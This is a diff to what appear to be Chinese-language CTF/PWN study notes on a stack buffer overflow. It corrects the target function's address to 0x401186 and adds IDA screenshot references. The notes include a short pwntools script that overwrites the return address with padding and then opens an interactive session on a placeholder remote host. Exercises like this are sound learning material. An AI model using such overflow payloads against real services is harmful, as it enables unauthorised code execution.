@@ -103,14 +103,22 @@ int fun()
 
 使用 IDA 64 可以轻松地获取 `s` 的地址为 `[rbp-Fh]`
 
-点击 `fun()` 在窗口左下角可以获得该函数位于 `0x00001186`
+点击 `fun()` 在窗口左下角可以获得该函数位于 `0x401186`
+
+![PWN-rip-1](./Notes-on-PWN/PWN-rip-1.png)
+
+当然，也可以直接从汇编界面找到该函数的地址
+
+![PWN-rip-2](./Notes-on-PWN/PWN-rip-2.png)
+
+![PWN-rip-3](./Notes-on-PWN/PWN-rip-3.png)
 
 由此我们可以写出脚本
 
 ```python
 from pwn import *
 p = remote("<IP Address>", <Port>)
-payload = b'A' * 0xF + p64(0x00401186)
+payload = b'A' * 0xF + p64(0x401186)
 p.sendline(payload)
 p.interactive()
 ```
